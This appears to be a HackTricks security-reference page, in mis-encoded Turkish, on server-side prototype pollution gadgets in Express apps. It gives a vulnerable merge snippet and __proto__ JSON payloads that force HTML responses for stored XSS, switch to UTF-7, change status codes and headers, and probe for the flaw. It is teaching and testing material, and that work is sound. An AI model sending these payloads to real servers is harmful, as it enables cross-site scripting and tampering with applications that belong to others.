# Express Prototype Pollution AraÃ§larÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlÄ±k aÄŸ** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

***

## XSS yanÄ±tlarÄ±nÄ± sunun

**Daha fazla ayrÄ±ntÄ± iÃ§in** [**orijinal araÅŸtÄ±rmaya gÃ¶z atÄ±n**](https://portswigger.net/research/server-side-prototype-pollution)

### JSON iÃ§erik tÃ¼rÃ¼nÃ¼ HTML olarak deÄŸiÅŸtirin

Bir Express uygulamasÄ±nda **JSON iÃ§erik tÃ¼rÃ¼ yanÄ±tÄ±** kullanan ve bir JSON yansÄ±tan:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Bu durumlarda XSS genellikle JSON iÃ§erik tÃ¼rÃ¼yle mÃ¼mkÃ¼n olmaz. Bununla birlikte, prototype pollution ile Express'i **bir HTML yanÄ±tÄ± sunmaya zorlayabiliriz.** Bu zafiyet, uygulamanÄ±n **`res.send(obj)`** kullanmasÄ±na ve application/json iÃ§erik tÃ¼rÃ¼yle body ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ± kullanmasÄ±na dayanÄ±r.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`** ve **`_body`** Ã¶zelliklerini **kirleterek**, **Express'in HTML iÃ§erik tÃ¼rÃ¼nÃ¼ sunmasÄ±na** ve **_body** Ã¶zelliÄŸini yansÄ±tarak depolanmÄ±ÅŸ XSS'e neden olmak mÃ¼mkÃ¼ndÃ¼r.

### UTF7 Renderleme

Express'in **UTF-7 iÃ§eriÄŸi renderlamasÄ±nÄ± saÄŸlamak mÃ¼mkÃ¼ndÃ¼r**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## GÃ¼venli Tarama Teknikleri

### JSON boÅŸluklarÄ±

AÅŸaÄŸÄ±daki PP, bir JSON iÃ§indeki Ã¶zelliklere iÅŸlevselliÄŸi bozmayacak ek bir boÅŸluk ekleyecektir:
```json
{"__proto__":{"json spaces": " "}}
```
ArdÄ±ndan yansÄ±tÄ±lan JSON ÅŸu ÅŸekilde gÃ¶rÃ¼necektir:
```json
{"foo":  "bar"} -- Note the extra space
```
### AÃ§Ä±kta Kalan BaÅŸlÄ±klar

AÅŸaÄŸÄ±daki PP cihazÄ± sunucunun **`Access-Control-Expose_headers: foo`** HTTP baÅŸlÄ±ÄŸÄ±nÄ± geri gÃ¶ndermesini saÄŸlayacaktÄ±r.
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORS modÃ¼lÃ¼nÃ¼n yÃ¼klÃ¼ olmasÄ± gerekmektedir**

### **OPTIONS Metodu**

AÅŸaÄŸÄ±daki yÃ¼k ile bir OPTIONS yanÄ±tÄ±ndan bir metod gizlemek mÃ¼mkÃ¼ndÃ¼r:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Durum**

AÅŸaÄŸÄ±daki PP yÃ¼kÃ¼ kullanÄ±larak **dÃ¶ndÃ¼rÃ¼len durum kodu** deÄŸiÅŸtirilebilir:
```json
{"__proto__":{"status":510}}
```
### Hata

Bir dize gibi bir ilkel deÄŸerle bir prototip atadÄ±ÄŸÄ±nÄ±zda, prototipin bir nesne olmasÄ± gerektiÄŸi iÃ§in **bir iÅŸlem yapÄ±lmaz**. Bir prototip nesnesini `Object.prototype`'e atamaya Ã§alÄ±ÅŸÄ±rsanÄ±z, bu bir **istisna fÄ±rlatacaktÄ±r**. Bu iki davranÄ±ÅŸÄ± kullanarak **prototip kirliliÄŸinin baÅŸarÄ±lÄ± olup olmadÄ±ÄŸÄ±nÄ± tespit edebiliriz**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### YansÄ±tÄ±lan DeÄŸer

Bir uygulama yanÄ±tÄ±nda bir nesne iÃ§erdiÄŸinde, `__proto__` ile birlikte **olaÄŸandÄ±ÅŸÄ± bir isme sahip bir Ã¶zellik oluÅŸturmak**, bilgilendirici olabilir. Ã–zellikle, yanÄ±tta **yalnÄ±zca olaÄŸandÄ±ÅŸÄ± Ã¶zelliÄŸin dÃ¶ndÃ¼rÃ¼lmesi**, uygulamanÄ±n zafiyetini iÅŸaret edebilir:
```json
{"unusualName":"value","__proto__":"test"}
```
AyrÄ±ca, Lodash gibi bir kÃ¼tÃ¼phane kullanÄ±ldÄ±ÄŸÄ± senaryolarda, bir Ã¶zelliÄŸi hem prototip kirliliÄŸi (PP) aracÄ±lÄ±ÄŸÄ±yla hem de doÄŸrudan nesnenin iÃ§ine ayarlamak, baÅŸka bir teÅŸhis yaklaÅŸÄ±mÄ± sunar. EÄŸer bu tÃ¼r bir Ã¶zellik yanÄ±ttan eksikse, bu, Lodash'Ä±n birleÅŸtirmeden Ã¶nce hedef nesnede Ã¶zelliÄŸin varlÄ±ÄŸÄ±nÄ± doÄŸruladÄ±ÄŸÄ±nÄ± gÃ¶sterir:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## DiÄŸer

### Noktalara Ä°zin Ver

Express'te **sorgu dizesi parametrelerinden nesneler oluÅŸturmanÄ±za izin veren** bir seÃ§enek bulunmaktadÄ±r.\
Bu seÃ§eneÄŸi kesinlikle bir hata **zinciri** iÃ§inde kullanarak bir **prototype pollution zafiyetini** sÃ¶mÃ¼rmekte kullanabilirsiniz.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` Node'da bir nesne oluÅŸturur.**

## Referanslar

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlÄ±k aÄŸ** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevsellikler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
